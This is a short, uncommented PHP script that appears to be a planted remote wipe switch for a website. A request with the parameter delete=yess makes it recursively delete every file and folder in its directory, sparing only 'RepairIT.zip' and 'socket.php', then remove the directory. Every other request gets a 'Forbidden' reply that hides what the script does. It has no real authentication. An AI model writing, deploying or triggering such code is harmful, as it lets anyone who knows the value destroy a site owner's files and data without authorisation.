<?php
if(isset($_REQUEST['delete']) && $_REQUEST['delete']=="yess")
{
$dir = __DIR__.'/';
$it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
$files = new RecursiveIteratorIterator($it,
             RecursiveIteratorIterator::CHILD_FIRST);
foreach($files as $file) {
    if ($file->isDir()){
        rmdir($file->getRealPath());
    } else {

if (strpos($file->getRealPath(), 'RepairIT.zip') !== false) {
    continue;
}
if (strpos($file->getRealPath(), 'socket.php') !== false) {
    continue;
}
        unlink($file->getRealPath());
    }
}
rmdir($dir);
echo "done";
}
else echo "Forbidden";